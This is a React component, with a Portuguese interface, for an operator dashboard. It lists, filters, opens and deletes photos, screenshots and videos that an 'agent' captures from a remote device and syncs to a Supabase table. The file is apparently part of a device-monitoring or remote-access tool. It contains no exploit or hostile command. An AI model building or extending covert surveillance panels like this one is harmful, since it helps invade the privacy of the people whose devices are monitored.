import React, { useState, useEffect } from 'react';
import { Image, Video, Download, Trash2, Play, Loader, ExternalLink } from 'lucide-react';
import { supabase } from '../../lib/supabase';

const MediaGallery = () => {
  const [mediaItems, setMediaItems] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [selectedDevice, setSelectedDevice] = useState<any>(null);
  const [filter, setFilter] = useState<'all' | 'photo' | 'video'>('all');

  useEffect(() => {
    const fetchDeviceAndMedia = async () => {
      const savedDeviceId = localStorage.getItem('selectedDeviceId');

      const { data: devices } = await supabase
        .from('devices')
        .select('*')
        .order('last_seen', { ascending: false });

      if (devices && devices.length > 0) {
        const device = savedDeviceId
          ? devices.find(d => d.id === savedDeviceId) || devices[0]
          : devices[0];
        setSelectedDevice(device);
      }
    };

    fetchDeviceAndMedia();
  }, []);

  useEffect(() => {
    if (!selectedDevice?.id) {
      setLoading(false);
      return;
    }

    fetchMedia();

    // Realtime subscription
    const channel = supabase
      .channel(`media-${selectedDevice.id}`)
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'captured_media',
        filter: `device_id=eq.${selectedDevice.id}`
      }, (payload) => {
        setMediaItems(prev => [payload.new, ...prev]);
      })
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [selectedDevice]);

  const fetchMedia = async () => {
    if (!selectedDevice?.id) return;

    setLoading(true);
    try {
      const { data, error } = await supabase
        .from('captured_media')
        .select('*')
        .eq('device_id', selectedDevice.id)
        .order('timestamp', { ascending: false })
        .limit(200);

      if (!error && data) {
        setMediaItems(data);
      }
    } catch (err) {
      console.error('Erro ao buscar mídia:', err);
    } finally {
      setLoading(false);
    }
  };

  const deleteMedia = async (id: string) => {
    if (!confirm('Deseja excluir este arquivo?')) return;

    const { error } = await supabase
      .from('captured_media')
      .delete()
      .eq('id', id);

    if (!error) {
      setMediaItems(prev => prev.filter(item => item.id !== id));
    }
  };

  const formatFileSize = (bytes: number | null) => {
    if (!bytes) return 'N/A';
    const kb = bytes / 1024;
    if (kb < 1024) return `${kb.toFixed(1)} KB`;
    return `${(kb / 1024).toFixed(1)} MB`;
  };

  const filteredMedia = mediaItems.filter(item => {
    if (filter === 'all') return true;
    if (filter === 'photo') return item.media_type?.includes('photo') || item.media_type === 'screenshot';
    if (filter === 'video') return item.media_type === 'video';
    return true;
  });

  return (
    <div className="h-full flex flex-col bg-bg-primary text-text-primary p-6 overflow-hidden">
      <div className="flex justify-between items-center mb-6">
        <div>
          <h2 className="text-2xl font-tactical font-bold text-accent-blue flex items-center gap-2">
            <Image className="animate-pulse" />
            GALERIA DE MÍDIA
          </h2>
          <p className="text-sm text-text-secondary font-mono">
            Acesso remoto a fotos e vídeos do dispositivo
          </p>
        </div>
        <div className="flex gap-2">
          <div className="flex gap-1 bg-bg-secondary border border-border-color rounded overflow-hidden">
            <button
              onClick={() => setFilter('all')}
              className={`px-3 py-2 text-xs font-bold font-tactical transition-colors ${
                filter === 'all' ? 'bg-accent-blue text-bg-primary' : 'text-text-secondary hover:bg-bg-tertiary'
              }`}
            >
              TUDO ({mediaItems.length})
            </button>
            <button
              onClick={() => setFilter('photo')}
              className={`px-3 py-2 text-xs font-bold font-tactical transition-colors ${
                filter === 'photo' ? 'bg-accent-blue text-bg-primary' : 'text-text-secondary hover:bg-bg-tertiary'
              }`}
            >
              FOTOS ({mediaItems.filter(m => m.media_type?.includes('photo') || m.media_type === 'screenshot').length})
            </button>
            <button
              onClick={() => setFilter('video')}
              className={`px-3 py-2 text-xs font-bold font-tactical transition-colors ${
                filter === 'video' ? 'bg-accent-blue text-bg-primary' : 'text-text-secondary hover:bg-bg-tertiary'
              }`}
            >
              VÍDEOS ({mediaItems.filter(m => m.media_type === 'video').length})
            </button>
          </div>
          <button
            onClick={fetchMedia}
            disabled={loading}
            className="flex items-center gap-2 px-4 py-2 bg-accent-blue/20 border border-accent-blue text-accent-blue rounded hover:bg-accent-blue/30 transition-colors text-xs font-bold font-tactical disabled:opacity-50"
          >
            {loading ? <Loader size={14} className="animate-spin" /> : <Download size={14} />}
            ATUALIZAR
          </button>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto custom-scrollbar">
        {loading ? (
          <div className="p-6 text-sm text-text-secondary font-mono flex items-center justify-center gap-2">
            <Loader className="animate-spin" size={16} />
            Carregando mídia...
          </div>
        ) : filteredMedia.length === 0 ? (
          <div className="p-6 text-sm text-text-secondary font-mono text-center">
            Sem mídia recebida. O agente começará a sincronizar fotos e vídeos automaticamente.
          </div>
        ) : (
          <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
            {filteredMedia.map(media => {
              const timestamp = new Date(media.timestamp);
              const date = timestamp.toLocaleDateString('pt-BR', { day: '2-digit', month: '2-digit' });
              const isVideo = media.media_type === 'video';
              const isPhoto = media.media_type?.includes('photo') || media.media_type === 'screenshot';

              return (
                <div key={media.id} className="group relative bg-bg-secondary rounded border border-border-color overflow-hidden hover:border-accent-blue transition-colors">
                  <div className="aspect-square bg-bg-tertiary flex items-center justify-center relative">
                    {isVideo && (
                      <Play className="absolute text-white bg-black/50 rounded-full p-2 w-10 h-10 backdrop-blur z-10" />
                    )}

                    {media.storage_url ? (
                      <img
                        src={media.storage_url}
                        alt={media.file_name}
                        className="w-full h-full object-cover"
                        onError={(e) => {
                          (e.target as HTMLImageElement).style.display = 'none';
                        }}
                      />
                    ) : (
                      <div className="w-full h-full bg-gradient-to-br from-bg-tertiary to-bg-secondary flex items-center justify-center text-text-muted">
                        {isPhoto ? <Image size={32} /> : <Video size={32} />}
                      </div>
                    )}
                  </div>

                  <div className="p-2">
                    <p className="text-xs font-bold text-text-primary truncate" title={media.file_name}>
                      {media.file_name || 'Sem nome'}
                    </p>
                    <div className="flex justify-between mt-1 text-[10px] text-text-muted font-mono">
                      <span>{formatFileSize(media.file_size)}</span>
                      <span>{date}</span>
                    </div>
                    {media.media_type && (
                      <div className="mt-1">
                        <span className="text-[9px] bg-accent-blue/20 text-accent-blue px-1 py-0.5 rounded font-bold uppercase">
                          {media.media_type.replace('_', ' ')}
                        </span>
                      </div>
                    )}
                  </div>

                  {/* Hover Actions */}
                  <div className="absolute top-2 right-2 flex gap-1 opacity-0 group-hover:opacity-100 transition-opacity bg-black/60 rounded p-1 backdrop-blur">
                    {media.storage_url && (
                      <a
                        href={media.storage_url}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="p-1 text-white hover:text-accent-blue"
                        title="Abrir em nova aba"
                      >
                        <ExternalLink size={14} />
                      </a>
                    )}
                    <button
                      onClick={() => deleteMedia(media.id)}
                      className="p-1 text-white hover:text-accent-red"
                      title="Excluir"
                    >
                      <Trash2 size={14} />
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
};

export default MediaGallery;
